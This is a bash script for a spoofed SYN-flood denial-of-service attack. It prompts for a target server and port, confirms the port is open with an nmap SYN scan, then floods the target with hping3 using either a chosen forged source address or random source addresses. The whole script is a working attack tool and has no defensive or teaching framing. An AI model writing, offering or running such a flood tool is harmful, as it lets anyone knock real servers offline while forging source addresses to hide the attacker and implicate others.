#!/usr/bin/bash

# Read IP and Port to Attack
echo "Enter Server"
read VIP

echo "Enter Port"
read VPORT

# Check if Port is open on that Server
CHECK=`sudo nmap -p $VPORT $VIP -sS | grep -c "open"`

if [ $CHECK -ge 1 ]; then
# If Port is open 
 echo "Port is Open"
 echo "How would you like to spoof? 1 Address Spoof (1) or Multiple (0)?" 
 read answer
  if [ $answer -eq 1 ]; then
  echo "Type in the address for the spoof"
  read SIP
  echo "Doing SYN FLOOD to escape do CTRL + C"
  sudo hping3 -S -p $VPORT --flood -a $SIP $VIP
 fi 
 if [ $answer -eq 0 ]; then
  echo "Doing Rand Source SYN FLOOD to escape do CTRL + C"
  sudo hping3 -S -p $VPORT --flood --rand-source $VIP
 fi
else
# If Port is not open
  echo "Either Port is not open or Server is offline, check inputs"
fi
